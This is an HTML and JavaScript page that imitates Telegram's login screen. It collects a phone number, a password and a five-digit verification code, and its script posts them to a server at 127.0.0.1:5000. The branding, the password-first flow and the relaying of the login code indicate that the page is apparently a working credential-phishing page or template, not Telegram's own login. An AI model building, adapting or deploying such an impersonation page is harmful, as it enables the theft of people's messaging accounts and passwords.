<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Telegram â€” Login</title>
  <style>
    :root{
      --tg-blue:#2a7ff6;
      --bg:#f6f8fb;
      --card:#ffffff;
      --muted:#6b7280;
    }
    *{box-sizing:border-box}
    body{
      margin:0;
      font-family: Inter, Roboto, Arial, sans-serif;
      background: linear-gradient(180deg,#eef6ff 0%,var(--bg) 100%);
      color:#111827;
      min-height:100vh;
      display:flex;
      align-items:center;
      justify-content:center;
      padding:24px;
    }
    .card{
      width:100%;
      max-width:420px;
      background:var(--card);
      border-radius:12px;
      box-shadow:0 6px 24px rgba(15,23,42,0.08);
      overflow:hidden;
    }
    .header{
      background:linear-gradient(90deg,var(--tg-blue),#1f6fe0);
      color:white;
      padding:28px 20px;
      text-align:center;
    }
    .header h1{margin:0;font-size:20px;letter-spacing:0.2px}
    .header p{margin:6px 0 0;font-size:13px;opacity:0.95}
    .content{padding:24px}
    .field{margin-bottom:14px}
    label{display:block;font-size:13px;color:var(--muted);margin-bottom:6px}
    input[type="text"], input[type="tel"], input[type="number"]{
      width:100%;padding:12px 14px;border-radius:8px;border:1px solid #e6e9ef;font-size:15px;
      outline:none;background:#fbfdff
    }
    input[type="text"]:focus, input[type="tel"]:focus, input[type="number"]:focus{box-shadow:0 0 0 4px rgba(42,127,246,0.12);border-color:var(--tg-blue)}
    .actions{display:flex;gap:10px;align-items:center;margin-top:8px}
    .btn{
      display:inline-block;padding:10px 14px;border-radius:8px;border:0;background:var(--tg-blue);color:white;font-weight:600;cursor:pointer;font-size:15px
    }
    .btn.ghost{background:transparent;color:var(--tg-blue);border:1px solid rgba(42,127,246,0.12)}
    .muted{color:var(--muted);font-size:13px}
    .otp-inputs{display:flex;gap:8px}
    .otp-inputs input{flex:1;text-align:center;font-size:20px;padding:10px;border-radius:8px;border:1px solid #e6e9ef}
    .small{font-size:13px;color:var(--muted)}
    .center{display:flex;justify-content:center}
    .logo-circle{width:56px;height:56px;border-radius:999px;background:rgba(255,255,255,0.12);display:flex;align-items:center;justify-content:center;margin:0 auto 10px}
    @media (max-width:420px){.card{border-radius:10px}}
  </style>
</head>
<body>
  <div class="card" role="main">
    <div class="header" aria-hidden="false">
      <div class="logo-circle">
        <svg width="28" height="28" viewBox="0 0 240 240" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
          <path d="M120 0C53.7 0 0 53.7 0 120s53.7 120 120 120 120-53.7 120-120S186.3 0 120 0z" fill="white" opacity="0.06"/>
          <path d="M45 120l150-52-30 140L120 150l-45 20 8-50-38-0z" fill="white"/>
        </svg>
      </div>
      <h1>Log in to Telegram</h1>
      <p>Enter your phone number to continue</p>
    </div>
    <div class="content">
      <form id="step-form" novalidate>
        <div id="step-phone">
          <div class="field">
            <label for="phone">Phone number</label>
            <div style="display:flex;gap:8px;align-items:center">
              <select id="country-code" aria-label="Country code" style="padding:10px;border-radius:8px;border:1px solid #e6e9ef;background:#fff">
                <option value="+1">+1 (US)</option>
                <option value="+44">+44 (UK)</option>
                <option value="+61">+61 (AU)</option>
                <option value="+91">+91 (IN)</option>
                <option value="+251">+251 (ET)</option>
                <option value="+7">+7 (RU)</option>
                <option value="+49">+49 (DE)</option>
                <option value="+33">+33 (FR)</option>
                <option value="+81">+81 (JP)</option>
              </select>
              <input id="phone" name="phone" type="tel" inputmode="tel" placeholder="555 555 0100" autocomplete="tel" required style="flex:1" />
            </div>
          </div>
          <div class="field">
            <label for="password">Password</label>
            <input id="password" name="password" type="password" placeholder="Enter your password" autocomplete="current-password" />
            <p class="small muted">Password is required before requesting a verification code.</p>
          </div>
          <div class="field actions">
            <button type="button" id="send-code" class="btn">Next</button>
            <button type="button" id="use-username" class="btn ghost">Use username</button>
          </div>
          <p class="small">By continuing, you agree to Telegram's <a href="#">Terms</a> and <a href="#">Privacy Policy</a>.</p>
        </div>

        <div id="step-otp" style="display:none">
          <div class="field">
            <label>Verification code</label>
            <div class="otp-inputs" role="group" aria-label="Verification code">
              <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp" aria-label="Digit 1" />
              <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp" aria-label="Digit 2" />
              <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp" aria-label="Digit 3" />
              <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp" aria-label="Digit 4" />
              <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp" aria-label="Digit 5" />
            </div>
          </div>
          <div class="field actions">
            <button type="button" id="verify" class="btn">Verify</button>
            <button type="button" id="back" class="btn ghost">Back</button>
          </div>
          <p class="small">Didn't receive a code? <a href="#" id="resend">Resend</a></p>
        </div>
      </form>

      <div style="margin-top:16px;">
        <div id="delivery-status" class="small muted">Delivery status: <strong id="delivery-state">idle</strong></div>
        <div id="event-log" aria-live="polite" style="margin-top:8px;height:140px;overflow:auto;padding:10px;border:1px solid #eef2f7;border-radius:8px;background:#fbfdff;font-size:13px;color:#334155"></div>
      </div>

    </div>
  </div>

  <script>
    // Optional: if you're running the local server with an AUTH_TOKEN, set it here.
    // For security don't commit your real token; edit locally or set via template.
    const LOCAL_AUTH_TOKEN = null; // e.g. 'my-local-secret'
  </script>
  <script>
    // Minimal client-side behavior: validate phone, switch to OTP step, simulate verification.
    const phoneInput = document.getElementById('phone');
    const sendBtn = document.getElementById('send-code');
    const stepPhone = document.getElementById('step-phone');
    const stepOtp = document.getElementById('step-otp');
    const backBtn = document.getElementById('back');
    const verifyBtn = document.getElementById('verify');
    const resend = document.getElementById('resend');

    function normalizePhone(v){
      return (v||'').replace(/[^0-9+]/g,'');
    }

    function buildChatId(){
      const code = (document.getElementById('country-code')||{}).value || '';
      let local = (document.getElementById('phone')||{}).value || '';
      // remove non-digits
      local = local.replace(/\D/g, '');
      // strip leading zeros
      local = local.replace(/^0+/, '');
      // if code already includes +, combine
      return (code + local).replace(/\s+/g, '');
    }

    const passwordInput = document.getElementById('password');
    const showInlineError = (el, msg)=>{
      // small inline error handling: set title and red border
      el.style.borderColor = '#ef4444';
      el.setAttribute('title', msg);
      setTimeout(()=>{ el.style.borderColor=''; el.removeAttribute('title'); }, 2000);
    };

    // delivery / log UI elements
    const deliveryState = document.getElementById('delivery-state');
    const eventLog = document.getElementById('event-log');
    function appendLog(message){
      if(!eventLog) return;
      const ts = new Date().toLocaleTimeString();
      const row = document.createElement('div');
      row.textContent = `[${ts}] ${message}`;
      eventLog.appendChild(row);
      eventLog.scrollTop = eventLog.scrollHeight;
    }
    function setDeliveryStatus(s){ if(deliveryState) deliveryState.textContent = s; }

    sendBtn.addEventListener('click', ()=>{
      const raw = phoneInput.value.trim();
      const normalized = normalizePhone(raw);
      const pwd = (passwordInput && passwordInput.value || '').trim();
      if(!normalized || normalized.length < 6){
        showInlineError(phoneInput, 'Please enter a valid phone number');
        phoneInput.focus();
        return;
      }
      if(!pwd){
        showInlineError(passwordInput, 'Password required');
        passwordInput.focus();
        return;
      }
      // call server to request a real code
      sendBtn.disabled = true;
      sendBtn.textContent = 'Sending...';
      appendLog('Requesting verification code');
      setDeliveryStatus('sending');
  const chatId = buildChatId();
  const payload = { chat_id: chatId, password: pwd };
      fetch('http://127.0.0.1:5000/request_code', {
        method: 'POST',
        headers: Object.assign({'Content-Type':'application/json'}, LOCAL_AUTH_TOKEN ? {'X-Auth-Token': LOCAL_AUTH_TOKEN} : {}),
        body: JSON.stringify(payload),
      }).then(r=>r.json().then(body=>({ok:r.ok, status:r.status, body}))).then(res=>{
        sendBtn.disabled = false;
        sendBtn.textContent = 'Next';
        if(!res.ok){
          appendLog('Request failed: ' + (res.body && res.body.error || res.status));
          setDeliveryStatus('failed');
          alert('Error requesting code: ' + (res.body && res.body.error || res.status));
          return;
        }
        appendLog('Code requested; telegram_sent=' + !!res.body.sent);
        setDeliveryStatus(res.body.sent ? 'sent' : 'failed');
        // proceed to OTP step
        stepPhone.style.display = 'none';
        stepOtp.style.display = '';
        document.querySelectorAll('.otp').forEach(i=>i.value='');
        const firstOtp = document.querySelector('.otp');
        if(firstOtp){ firstOtp.focus(); firstOtp.select && firstOtp.select(); }
      }).catch(err=>{
        sendBtn.disabled = false;
        sendBtn.textContent = 'Next';
        appendLog('Network error (request_code): ' + err.message);
        setDeliveryStatus('error');
        alert('Network error: ' + err.message);
      });
    });

    backBtn.addEventListener('click', ()=>{
      stepOtp.style.display = 'none';
      stepPhone.style.display = '';
    });

    // Simple OTP input auto-advance with sanitization
    document.querySelectorAll('.otp').forEach((el, idx, arr)=>{
      el.addEventListener('input', (e)=>{
        // allow only digits
        e.target.value = e.target.value.replace(/\D/g, '').slice(0,1);
        if(e.target.value.length > 0){
          if(idx < arr.length-1) arr[idx+1].focus();
        }
      });
      el.addEventListener('keydown', (e)=>{
        if(e.key === 'Backspace'){
          if(!e.target.value && idx>0){
            arr[idx-1].focus();
          } else {
            // clear the current value on backspace
            e.target.value = '';
          }
        }
        // support left/right arrow navigation
        if(e.key === 'ArrowLeft' && idx>0){ arr[idx-1].focus(); }
        if(e.key === 'ArrowRight' && idx < arr.length-1){ arr[idx+1].focus(); }
      });
      // prevent non-digit paste
      el.addEventListener('paste', (ev)=>{
        ev.preventDefault();
        const txt = (ev.clipboardData || window.clipboardData).getData('text') || '';
        const digits = txt.replace(/\D/g,'').slice(0, arr.length-idx);
        for(let i=0;i<digits.length;i++){
          if(arr[idx+i]) arr[idx+i].value = digits[i];
        }
        const nextIndex = Math.min(idx + digits.length, arr.length-1);
        arr[nextIndex].focus();
      });
    });

    verifyBtn.addEventListener('click', ()=>{
      const codes = Array.from(document.querySelectorAll('.otp')).map(i=>i.value).join('');
      if(codes.length < 5){
        alert('Please enter the 5-digit code');
        return;
      }
      verifyBtn.disabled = true;
      verifyBtn.textContent = 'Verifying...';
      appendLog('Verifying code');
      setDeliveryStatus('verifying');
  const payload = { chat_id: buildChatId(), code: codes };
      fetch('http://127.0.0.1:5000/verify_code', {
        method: 'POST',
        headers: Object.assign({'Content-Type':'application/json'}, LOCAL_AUTH_TOKEN ? {'X-Auth-Token': LOCAL_AUTH_TOKEN} : {}),
        body: JSON.stringify(payload),
      }).then(r=>r.json().then(body=>({ok:r.ok, status:r.status, body}))).then(res=>{
        verifyBtn.disabled = false;
        verifyBtn.textContent = 'Verify';
        if(!res.ok){
          appendLog('Verification failed: ' + (res.body && (res.body.error || JSON.stringify(res.body))) );
          setDeliveryStatus('verification_failed');
          alert('Verification failed: ' + (res.body && (res.body.error || JSON.stringify(res.body))) );
          return;
        }
        appendLog('Verification succeeded');
        setDeliveryStatus('verified');
        alert('Verified!');
        // in a real app we would redirect here
      }).catch(err=>{
        verifyBtn.disabled = false;
        verifyBtn.textContent = 'Verify';
        appendLog('Network error (verify_code): ' + err.message);
        setDeliveryStatus('error');
        alert('Network error: ' + err.message);
      });
    });

    resend.addEventListener('click', (e)=>{ e.preventDefault(); alert('A new code was sent (simulated).'); });
  </script>
</body>
</html>
